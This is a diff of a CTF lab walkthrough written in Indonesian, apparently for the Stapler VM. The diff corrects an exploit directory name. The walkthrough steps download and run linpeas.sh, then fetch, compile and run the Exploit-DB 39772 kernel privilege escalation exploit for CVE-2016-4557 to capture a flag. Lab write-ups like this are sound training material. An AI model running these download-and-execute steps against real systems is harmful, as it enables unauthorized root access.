@@ -62,6 +62,7 @@ ssh SHayslett@<ip_server>
 wget https://github.com/carlospolop/PEASS-ng/releases/download/20220731/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh
+
 ```
 - dan tunggu (lumayan lama)
 - scroll ke atas temukan **[CVE 2016 4557] double-fdput**
@@ -73,9 +74,10 @@ wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/mast
 unzip 39772.zip
 cd 39772
 tar -xvf exploit.tar
-cd ehb_mapfd_doubleput_exploit
+cd ebpf_mapfd_doubleput_exploit
 ./compile.sh
 ./doubleputs
+
 ```
 - temukan flag
 ```
